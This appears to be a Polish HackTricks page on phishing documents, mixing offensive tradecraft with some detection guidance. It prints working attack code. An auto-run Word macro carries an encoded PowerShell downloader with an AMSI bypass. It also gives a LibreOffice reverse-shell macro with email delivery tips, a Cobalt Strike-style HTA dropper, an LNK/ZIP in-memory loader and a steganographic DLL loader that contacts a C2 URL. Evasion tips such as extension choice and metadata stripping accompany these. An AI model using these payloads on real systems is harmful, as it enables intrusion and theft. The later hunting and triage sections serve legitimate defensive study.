# Pliki i dokumenty phishingowe

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word przeprowadza walidację danych pliku przed jego otwarciem. Walidacja danych polega na identyfikacji struktury danych zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi błąd, analizowany plik nie zostanie otwarty.

Zazwyczaj pliki Word zawierające makra używają rozszerzenia `.docm`. Można jednak zmienić rozszerzenie pliku i nadal zachować możliwość wykonywania makr.\
Na przykład plik RTF z założenia nie obsługuje makr, ale plik DOCM ze zmienionym rozszerzeniem na RTF zostanie obsłużony przez Microsoft Word i będzie mógł wykonywać makra.\
Te same mechanizmy i rozwiązania wewnętrzne dotyczą całego pakietu Microsoft Office (Excel, PowerPoint itp.).

Możesz użyć poniższego polecenia, aby sprawdzić, które rozszerzenia będą obsługiwane przez niektóre programy Office:

```bash
assoc | findstr /i "word excel powerp"
```

Pliki DOCX odwołujące się do zdalnego szablonu (Plik – Opcje – Dodatki – Zarządzaj: Szablony – Przejdź), który zawiera makra, mogą również „wykonywać” makra.

### Zewnętrzne ładowanie obrazu

Przejdź do: _Wstawianie --> Szybkie części --> Pole_\
_**Kategorie**: Łącza i odwołania, **Nazwy pól**: includePicture, oraz **Nazwa pliku lub adres URL**:_ http://<ip>/whatever

![Dokumenty Office — zewnętrzne ładowanie obrazu: Przejdź do: Wstawianie -- Szybkie części -- Pole](<../../images/image (155).png>)

Informacje o analizie otrzymanego dokumentu zamiast tworzenia nowego znajdziesz w sekcji [Analiza makr VBA: kod śmieciowy i formularze UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Backdoor makr

Makra mogą służyć do uruchamiania dowolnego kodu z dokumentu.

#### Funkcje autoload

Im częściej są używane, tym większe prawdopodobieństwo, że wykryje je AV.

- AutoOpen()
- Document_Open()

#### Przykłady kodu makr

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ręczne usuwanie metadanych

Przejdź do **Plik > Informacje > Inspekcja dokumentu > Inspekcja dokumentu**, aby otworzyć Inspektora dokumentów. Kliknij **Inspekcja**, a następnie **Usuń wszystko** obok **Właściwości dokumentu i informacje osobiste**.

#### Rozszerzenie dokumentu

Po zakończeniu wybierz listę rozwijaną **Zapisz jako typ** i zmień format z **`.docx`** na Word 97-2003 **`.doc`**.\
Zrób to, ponieważ **nie można zapisywać makr w plikach `.docx`**, a rozszerzenie obsługujące makra **`.docm`** ma **złą reputację** (np. ikona miniatury zawiera duży znak `!`, a niektóre bramki internetowe/pocztowe całkowicie je blokują). Dlatego **starsze rozszerzenie `.doc` to najlepszy kompromis**.

#### Generatory złośliwych makr

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Makra autostartowe LibreOffice ODT (Basic)

Dokumenty LibreOffice Writer mogą zawierać makra Basic, które uruchamiają się automatycznie po otwarciu pliku, jeśli makro zostanie przypisane do zdarzenia **Otwórz dokument** (Narzędzia → Dostosuj → Zdarzenia → Otwórz dokument → Makro…).<sup>[[1]](#references)</sup> Proste makro reverse shell wygląda tak:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Zwróć uwagę na podwójne cudzysłowy (`""`) wewnątrz ciągu znaków — LibreOffice Basic używa ich do escapowania dosłownych cudzysłowów, więc payloady kończące się na `...==""")` zachowują zrównoważone cudzysłowy zarówno w poleceniu wewnętrznym, jak i argumencie Shell.

Wskazówki dotyczące dostarczenia:

- Zapisz plik jako `.odt` i przypisz makro do zdarzenia dokumentu, aby uruchamiało się natychmiast po otwarciu.
- Wysyłając wiadomość e-mail za pomocą `swaks`, użyj `--attach @resume.odt` (`@` jest wymagane, aby załącznikiem były bajty pliku, a nie ciąg znaków z nazwą pliku). Jest to kluczowe przy nadużywaniu serwerów SMTP, które akceptują dowolnych odbiorców `RCPT TO` bez weryfikacji.

## Pliki HTA

HTA to program Windows, który **łączy HTML z językami skryptowymi (takimi jak VBScript i JScript)**. Generuje interfejs użytkownika i uruchamia się jako aplikacja „w pełni zaufana”, bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA uruchamia się za pomocą **`mshta.exe`**, który jest zazwyczaj **instalowany** wraz z **Internet Explorerem**, przez co **`mshta` zależy od IE**. Jeśli więc zostanie on odinstalowany, pliki HTA nie będą mogły się uruchomić.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Fałszywe karty załączników w wiadomościach e-mail w formacie HTML

Wiadomość e-mail w formacie HTML może naśladować natywną kartę podglądu załącznika dostawcy, nie zawierając prawdziwego załącznika. Talos zaobserwował kartę Gmaila odtworzoną z czterech części MIME z wbudowanymi obrazami PNG zakodowanymi w Base64. Cały element wizualny był objęty jednym odnośnikiem, a wartość odbiorcy w `?m=<target-id>` umożliwiała śledzenie poszczególnych odbiorców. Odnośnik zaczynał się od `//`, a nie od `http://` ani `https://`; przeglądarki rozpoznają tę formę z pominiętym protokołem, ale ekstraktory URL dopasowujące tylko w pełni kwalifikowane adresy mogą ją przeoczyć.<sup>[[11]](#references)</sup>

Podczas analizy sprawdź surowe MIME zamiast ufać wyrenderowanej liście załączników. Odtwórz sposób, w jaki wbudowane części obrazu tworzą kartę wizualną, znajdź obejmujący ją odnośnik i znormalizuj wartości `href` z pominiętym protokołem przed wyodrębnianiem URL.<sup>[[11]](#references)</sup>

Informacje o podszywaniu się pod nadawcę w kopercie/nagłówku i testowaniu zgodności DMARC znajdziesz w artykule [Środki zaradcze przeciwko podszywaniu się pod nadawcę SMTP](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów na **zdalne wymuszenie uwierzytelniania NTLM**. Możesz na przykład dodać **niewidoczne obrazy** do wiadomości e-mail lub kodu HTML, który użytkownik otworzy (nawet przez HTTP MitM?). Możesz też wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnianie** już przy **otwarciu folderu**.

**Sprawdź te pomysły i inne na poniższych stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Pamiętaj, że możesz nie tylko wykraść hash lub dane uwierzytelniające, ale także **przeprowadzać ataki NTLM relay**:

- [**Ataki NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay do certyfikatów)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Programy ładujące LNK + payloady osadzone w ZIP-ie (łańcuch bezplikowy)

Wysoce skuteczne kampanie dostarczają plik ZIP zawierający dwa wiarygodnie wyglądające dokumenty-przynęty (PDF/DOCX) i złośliwy plik .lnk. Sztuczka polega na tym, że właściwy program ładujący PowerShell jest zapisany w surowych bajtach pliku ZIP, za unikatowym znacznikiem, a plik .lnk wyodrębnia go i uruchamia w całości w pamięci.<sup>[[2]](#references)</sup>

Typowy przepływ zaimplementowany jako jednolinijkowy skrypt PowerShell w pliku .lnk:

1) Znajdź oryginalny plik ZIP w typowych lokalizacjach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz katalogu nadrzędnym bieżącego katalogu roboczego.
2) Odczytaj bajty pliku ZIP i znajdź zakodowany na stałe znacznik (np. xFIQCV). Wszystko, co znajduje się za znacznikiem, to osadzony payload PowerShell.
3) Skopiuj plik ZIP do %ProgramData%, wypakuj go tam i otwórz dokument-przynętę .docx, aby całość wyglądała wiarygodnie.
4) Omiń AMSI w bieżącym procesie: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Usuń obfuskację z kolejnego etapu (np. usuń wszystkie znaki #) i uruchom go w pamięci.

Przykładowy szkielet PowerShell do wyodrębnienia i uruchomienia osadzonego etapu:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notatki
- Dostarczanie często wykorzystuje renomowane subdomeny PaaS (np. *.herokuapp.com) i może ograniczać dostęp do payloadów (udostępniać nieszkodliwe pliki ZIP na podstawie adresu IP/UA).
- Kolejny etap często odszyfrowuje shellcode zakodowany w base64/XOR i wykonuje go za pomocą Reflection.Emit + VirtualAlloc, aby ograniczyć ślady na dysku.

Persistence używane w tym samym łańcuchu
- Przejęcie COM TypeLib kontrolki Microsoft Web Browser, dzięki któremu IE/Explorer lub każda aplikacja osadzająca tę kontrolkę automatycznie ponownie uruchamia payload.<sup>[[2]](#references)[[4]](#references)</sup> Szczegóły i gotowe do użycia polecenia znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOC
- Pliki ZIP zawierające dołączony na końcu danych archiwum ciąg znaków ASCII (np. xFIQCV).
- Plik .lnk, który przeszukuje foldery nadrzędne/użytkownika, aby znaleźć plik ZIP, i otwiera dokument-przynętę.
- Manipulowanie AMSI za pomocą [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długie wątki biznesowe kończące się linkami hostowanymi w zaufanych domenach PaaS.

## Podstępne pliki LNK otwierające przynętę jako pierwszą → persistence przez zaplanowane zadanie → side-loading zaufanego CPL

Innym powtarzającym się schematem jest **plik `.lnk` podszywający się pod dokument**, który natychmiast otwiera nieszkodliwą przynętę, a jednocześnie w tle przygotowuje właściwy łańcuch.<sup>[[3]](#references)</sup>

Zaobserwowany przebieg:
1. Skrót **podszywa się pod plik PDF** i używa `conhost.exe` lub podobnego proxy do uruchomienia zaciemnionego downloadera PowerShell.
2. PowerShell rozdziela oczywiste tokeny (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), przez co proste mechanizmy wykrywania szukające `iwr`, `gci`, `ren`, `cpi` lub `schtasks` nie rozpoznają polecenia.
3. Stager najpierw pobiera **dokument-przynętę**, otwiera go dla ofiary, a następnie w tle odtwarza złośliwe pliki.
4. Payloady mogą być zapisywane z **nietypowymi rozszerzeniami**, a następnie zmieniać nazwę przez usunięcie znaków wypełniających, co opóźnia pojawienie się oczywistych artefaktów `.exe` / `.cpl`.
5. Persistence jest ustanawiane za pomocą **zaplanowanego zadania uruchamianego co minutę**, które uruchamia zaufany plik binarny z lokalizacji zapisywalnej przez użytkownika.

Podstawowe wskazówki do huntingu w tym schemacie:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Przydatny układ stagingu, który warto rozpoznawać:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Dlaczego drugi etap jest trudny do wykrycia

W analizie przypadku Rapid7 zaplanowane zadanie wielokrotnie uruchamiało **`Fondue.exe`** z `C:\Users\Public\`. Ponieważ plik **`APPWIZ.cpl`** umieszczono w tym samym katalogu, a eksportował funkcję **`RunFODW`**, zaufany plik binarny Microsoftu ładował bocznie CPL atakującego zamiast legalnej kopii systemowej.

CPL następnie:
- Odczytuje blob **AES-256-CBC** z `C:\Windows\Tasks\editor.dat`
- Odszyfrowuje go za pomocą **Windows CNG / `bcrypt.dll`**
- Przydziela pamięć wykonywalną i kopiuje do niej odszyfrowany shellcode
- Uruchamia go pośrednio, przekazując wskaźnik do shellcode jako funkcję callback dla **`EnumUILanguagesW`**

Ostatni krok warto wyszukiwać osobno: malware często unika bezpośredniego skoku `((void(*)())buf)()` i zamiast tego nadużywa **legalnego WinAPI przyjmującego funkcję callback**, aby przekazać wykonanie.

Odszyfrowanym payloadem w tej kampanii był shellcode **Donut**, który następnie w całości mapował końcowy plik PE w pamięci i modyfikował **AMSI/WLDP/ETW** w bieżącym procesie przed przekazaniem wykonania. Więcej informacji o side-loadingu i przetwarzaniu po wykonaniu rezydującym w pamięci znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktyczne punkty do wyszukiwania:
- Plik `.lnk` uruchamiający `powershell.exe` lub `conhost.exe`, a następnie widoczny dokument-przynętę.
- Krótkotrwałe pobrania do **`C:\Users\Public\`**, po których od razu następuje zmiana nazw plików z bezsensownymi rozszerzeniami.
- Zaplanowane zadania o mało charakterystycznych nazwach, takich jak `GoogleErrorReport`, uruchamiane z **katalogów z prawem zapisu dla użytkownika**.
- Zaufane pliki binarne ładujące pliki **`.cpl` / `.dll`** z tego samego katalogu innego niż systemowy.
- Bloby tekstowe Base64 zapisywane w **`C:\Windows\Tasks\`**, a następnie odczytywane przez moduł załadowany bocznie.

## Payloady w obrazach ograniczone znacznikami steganograficznymi (PowerShell stager)

Najnowsze łańcuchy loaderów dostarczają zaciemniony kod JavaScript/VBS, który dekoduje i uruchamia PowerShell stager w formacie Base64. Stager pobiera obraz (często GIF) zawierający zakodowany w Base64 plik DLL .NET, ukryty jako zwykły tekst między unikatowymi znacznikami początku i końca. Skrypt wyszukuje te znaczniki (przykłady zaobserwowane w środowisku naturalnym: «<<sudo_png>> … <<sudo_odt>>>»), wyodrębnia tekst między nimi, dekoduje go z Base64 do bajtów, ładuje zestaw w pamięci i wywołuje znaną metodę wejściową, przekazując jej adres URL C2.<sup>[[5]](#references)</sup>

Przebieg
- Etap 1: Archiwizowany dropper JS/VBS → dekoduje osadzone dane Base64 → uruchamia PowerShell stager z parametrami -nop -w hidden -ep bypass.
- Etap 2: PowerShell stager → pobiera obraz, wyodrębnia Base64 ograniczone znacznikami, ładuje plik DLL .NET w pamięci i wywołuje jego metodę (np. VAI), przekazując adres URL C2 i opcje.
- Etap 3: Loader pobiera końcowy payload i zazwyczaj wstrzykuje go przez process hollowing do zaufanego pliku binarnego (często MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Więcej informacji o process hollowing i proxy execution za pośrednictwem zaufanych narzędzi znajdziesz tutaj:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Przykład PowerShell wyodrębniający DLL z obrazu i wywołujący metodę .NET w pamięci:

<details>
<summary>PowerShell: ekstraktor i loader payloadu steganograficznego</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Uwagi
- Jest to ATT&CK T1027.003 (steganografia/ukrywanie markerów).<sup>[[6]](#references)</sup> Markery różnią się między kampaniami.
- Obejście AMSI/ETW i deobfuskacja ciągów znaków są często stosowane przed załadowaniem assembly.
- Wykrywanie: skanuj pobrane obrazy w poszukiwaniu znanych separatorów; identyfikuj przypadki, gdy PowerShell uzyskuje dostęp do obrazów i natychmiast dekoduje bloki Base64.

Zobacz także narzędzia stego i techniki carvingu:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## Droppery JS/VBS → etapowanie PowerShell przez Base64

Powtarzającym się etapem początkowym jest mały, mocno obfuskowany plik `.js` lub `.vbs` dostarczany w archiwum. Jego jedynym celem jest zdekodowanie osadzonego ciągu Base64 i uruchomienie PowerShell z argumentami `-nop -w hidden -ep bypass`, aby przygotować kolejny etap przez HTTPS.<sup>[[5]](#references)</sup>

Schemat logiki (abstrakcyjny):
- Odczytanie zawartości własnego pliku
- Znalezienie bloku Base64 pomiędzy ciągami śmieciowymi
- Zdekodowanie do postaci skryptu PowerShell w ASCII
- Wykonanie za pomocą `wscript.exe`/`cscript.exe`, które uruchamiają `powershell.exe`

Wskazówki do wykrywania
- Załączniki JS/VBS w archiwach, które uruchamiają `powershell.exe` z `-enc`/`FromBase64String` w wierszu poleceń.
- `wscript.exe` uruchamiający `powershell.exe -nop -w hidden` ze ścieżek tymczasowych użytkownika.

## Dokumenty MSC jako kontenery wykonawcze (GrimResource)

Pliki Microsoft Management Console (`.msc`) to definicje konsoli w formacie XML, zwykle otwierane przez `mmc.exe`. **GrimResource** wykorzystuje odwołanie `StringTable` do zasobu `apds.dll` zawierającego stary prymityw XSS, dzięki czemu otwarcie spreparowanej konsoli przez użytkownika powoduje uruchomienie JavaScriptu wewnątrz `mmc.exe`. Zaobserwowane próbki łączyły obfuskację opartą na `transformNode` z **DotNetToJScript**, aby utworzyć payload .NET bez typowej ścieżki makr Office.<sup>[[9]](#references)</sup>

Podczas wstępnej analizy statycznej traktuj niezaufany plik MSC jako tekst i **nie klikaj go dwukrotnie**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Ważnymi sygnałami behawioralnymi w czasie działania są: ładowanie przez `mmc.exe` środowiska CLR lub komponentów skryptowych, nawiązywanie połączeń sieciowych albo uruchamianie `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` lub nieoczekiwanego pliku wykonywalnego. Ten format jest legalny, dlatego detekcje powinny korelować **źródło + podejrzaną zawartość XML/skryptu + zachowanie `mmc.exe`**, zamiast blokować każdy plik MSC.<sup>[[9]](#references)</sup>

## Przekierowania przez PDF/kody QR i kontrolowanie dostarczania payloadu

PDF nie wymaga exploita, by być przydatny. W niedawnych kampaniach w dokumentach wyglądających na nieszkodliwe umieszczano **kod QR lub zwykły link**, przekierowywano sesję przeglądarki poza kontrolę poczty i personalizowano adres docelowy za pomocą adresu e-mail odbiorcy. Microsoft udokumentował w 2025 r. pliki PDF z adresami URL kodów QR unikalnymi dla każdego odbiorcy, prowadzącymi do infrastruktury RaccoonO365 wykradającej dane logowania; w równoległym łańcuchu, na podstawie adresu IP i środowiska, wybranym odwiedzającym zwracano ścieżkę JavaScript/MSI, a skanerom lub niedozwolonym klientom — nieszkodliwy plik PDF.<sup>[[10]](#references)</sup>

Analizuj zarówno akcje PDF, jak i wyrenderowane kody QR. Kod QR może być narysowany wektorowo, a nie zapisany jako obraz możliwy do wyodrębnienia, dlatego rasteryzuj każdą stronę oraz wyodrębniaj osadzone obrazy:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Sprawdzaj zdekodowane miejsca docelowe i przekierowania z odizolowanego systemu analitycznego, nie uwierzytelniając się. Przydatne cechy do wyszukiwania to pliki PDF zawierające wyłącznie kody QR i niemal puste treści wiadomości e-mail, adres e-mail odbiorcy osadzony w parametrze zapytania, kilka przekierowań przez renomowane usługi hostingowe oraz różna zawartość zwracana w zależności od adresu IP, geolokalizacji, plików cookie, nagłówka referrer lub user agenta. Porównuj żądania przy użyciu kontrolowanych profili, ponieważ pojedyncze pobranie w sandboxie może zwrócić jedynie przynętę.<sup>[[10]](#references)</sup>

## Pliki Windows służące do wykradania hashy NTLM

Zobacz stronę o **miejscach, z których można wykradać dane uwierzytelniające NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – makro LibreOffice → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampania ZipLine: zaawansowany atak phishingowy wymierzony w firmy z USA](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: śledzenie taktyk Dropping Elephant w łańcuchu loadera nawiązującym do Chin](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – nowa technika utrwalania obecności COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – loader PhantomVAI dostarcza różne infostealery](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console jako sposób na uzyskanie początkowego dostępu i uniknięcie wykrycia](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – aktorzy zagrożeń wykorzystują sezon rozliczeń podatkowych do przeprowadzania kampanii phishingowych o tematyce podatkowej](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – łańcuch dostarczania UAT-11587 i backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
